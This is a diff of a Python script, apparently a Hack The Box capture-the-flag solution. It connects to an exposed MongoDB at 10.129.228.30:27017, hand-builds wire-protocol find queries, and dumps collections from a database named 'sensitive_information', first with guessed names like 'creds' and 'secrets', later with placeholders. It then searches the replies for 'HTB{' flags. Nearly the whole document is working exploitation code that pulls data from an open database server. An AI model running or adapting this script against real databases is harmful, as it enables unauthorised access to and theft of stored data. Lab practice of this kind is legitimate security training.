@@ -1,99 +1,146 @@
-#!/usr/bin/env python3
 import socket
 import struct
-import bson
 
-# Target configuration
-ip = "10.129.228.30"
-port = 27017
-target_db = "sensitive_information"
-collections_to_try = [
-    "flag", "flags", "data", "secrets", "creds",
-    "dump", "info", "leaks"
-]
+def bson_find(coll_name):
+    cname = coll_name.encode()
+    parts = []
 
-# BSON helpers
-def build_bson(doc):
-    return bson.BSON.encode(doc)
+    parts.append(b'\x02')  # string
+    parts.append(b'find\x00')
+    parts.append(struct.pack('<i', len(cname) + 1))
+    parts.append(cname + b'\x00')
 
-def parse_bson(data):
-    try:
-        return bson.BSON(data).decode()
-    except:
-        return None
+    parts.append(b'\x03')  # embedded doc
+    parts.append(b'filter\x00')
+    parts.append(struct.pack('<i', 5))
+    parts.append(b'\x00')
 
-# Mongo wire protocol helpers
-def create_message(request_id, opcode, message):
-    header = struct.pack("<iiii", 16 + len(message), request_id, 0, opcode)
-    return header + message
+    payload = b''.join(parts)
+    total_length = struct.pack('<i', len(payload) + 4 + 1)
+    return total_length + payload + b'\x00'
 
-def build_query(collection, query=None):
-    if query is None:
-        query = {}
-    flags = 0
-    full_collection = f"{target_db}.{collection}"
-    header = struct.pack("<i", flags)
-    header += full_collection.encode() + b"\x00"
-    header += struct.pack("<ii", 0, 1)
-    header += build_bson(query)
-    return header
+def build_query(bson_doc, db_name="admin"):
+    full_collection = f"{db_name}.$cmd".encode() + b'\x00'
+    header_len = 16 + 4 + len(full_collection) + 4 + 4 + len(bson_doc)
+    header = struct.pack('<iiii', header_len, 1, 0, 2004)
+    flags = struct.pack('<i', 0)
+    skip = struct.pack('<i', 0)
+    ret = struct.pack('<i', -1)
+    return header + flags + full_collection + skip + ret + bson_doc
 
-def build_isMaster():
-    return build_query("$cmd", {"isMaster": 1})
+def parse_cstring(data, offset):
+    end = data.index(0, offset)
+    return data[offset:end].decode(), end + 1
 
-def build_list_databases():
-    return build_query("admin.$cmd", {"listDatabases": 1})
+def parse_string(data, offset):
+    strlen = struct.unpack_from('<i', data, offset)[0]
+    offset += 4
+    value = data[offset:offset + strlen - 1].decode()
+    offset += strlen
+    return value, offset
 
-def build_list_collections(database):
-    return build_query(f"{database}.$cmd", {"listCollections": 1})
+def parse_int32(data, offset):
+    value = struct.unpack_from('<i', data, offset)[0]
+    return value, offset + 4
 
-def build_find_query(database, collection):
-    return build_query(collection, {})
+def parse_document(data, offset):
+    doc_len = struct.unpack_from('<i', data, offset)[0]
+    end = offset + doc_len
+    offset += 4
+    doc = {}
 
-def send_and_receive(sock, message, request_id, opcode=2004):
-    full_message = create_message(request_id, opcode, message)
-    sock.sendall(full_message)
-    response = sock.recv(4096)
-    return response[16:] if len(response) > 16 else b''
+    while offset < end - 1:
+        type_byte = data[offset]
+        offset += 1
+        key, offset = parse_cstring(data, offset)
 
-# Extraction routine
-def extract_cursor_document(response):
-    try:
-        doc = parse_bson(response)
-        if not doc:
-            return None
-        if "cursor" in doc and "firstBatch" in doc["cursor"]:
-            return doc["cursor"]["firstBatch"]
-        return doc
-    except:
-        return None
+        if type_byte == 0x02:
+            value, offset = parse_string(data, offset)
+        elif type_byte == 0x10:
+            value, offset = parse_int32(data, offset)
+        elif type_byte == 0x01:
+            value = struct.unpack_from('<d', data, offset)[0]
+            offset += 8
+        elif type_byte == 0x08:
+            value = bool(data[offset])
+            offset += 1
+        elif type_byte == 0x03 or type_byte == 0x04:
+            value, offset = parse_document(data, offset)
+        else:
+            value = f"<unknown:{hex(type_byte)}>"
+            break
+
+        doc[key] = value
+
+    return doc, end
+
+def get_documents(raw):
+    docs = []
+    offset = 36
+    while offset < len(raw):
+        try:
+            doc, next_offset = parse_document(raw, offset)
+            docs.append(doc)
+            offset = next_offset
+        except:
+            break
+    return docs
+
+def send_query(sock, query):
+    sock.sendall(query)
+    return sock.recv(8192)
+
+def search_flag(d):
+    if isinstance(d, dict):
+        for k, v in d.items():
+            if isinstance(k, str) and "HTB{" in k:
+                return k
+            if isinstance(v, str) and "HTB{" in v:
+                return v
+            elif isinstance(v, dict):
+                result = search_flag(v)
+                if result:
+                    return result
+    return None
 
 def main():
-    sock = socket.socket()
-    sock.connect((ip, port))
-    request_id = 1
+    host = '10.129.228.30'
+    port = 27017
+    db = "YOUR-DB"
+    collnames = ["YOUR-DIR"]
 
-    print(f"[+] Connected to MongoDB @ {ip}, targeting DB: {target_db}\n")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+    print(f"[+] Connected to MongoDB @ {host}, targeting DB: {db}")
 
-    for collection in collections_to_try:
-        print(f"[>] Trying collection: {collection}")
-        message = build_find_query(target_db, collection)
-        response = send_and_receive(sock, message, request_id)
-        result = extract_cursor_document(response)
+    for coll in collnames:
+        print(f"  └─ Trying collection: {coll}")
+        try:
+            q = build_query(bson_find(coll), db)
+            r = send_query(s, q)
+            docs = get_documents(r)
 
-        if isinstance(result, list) and result:
-            for doc in result:
-                print(f"    [*] Document: {doc}")
-        elif isinstance(result, list) and not result:
-            print("    [!] Empty cursor returned.")
-        elif isinstance(result, dict):
-            print(f"    [*] Document: {result}")
-        else:
-            print("    [!] No valid response.")
+            if not docs:
+                print("     [-] No response")
+                continue
 
-        request_id += 1
+            if 'cursor' in docs[0] and 'firstBatch' in docs[0]['cursor']:
+                results = docs[0]['cursor']['firstBatch']
+            else:
+                results = docs
 
-    sock.close()
+            for d in results:
+                print(f"     [*] Document: {d}")
+                flag = search_flag(d)
+                if flag:
+                    print(f"\n FLAG FOUND: {flag}\n")
+                    s.close()
+                    return
+        except Exception as e:
+            print(f"     [!] Error: {e}")
+
+    print("[-] Flag not found.")
+    s.close()
 
 if __name__ == "__main__":
     main()
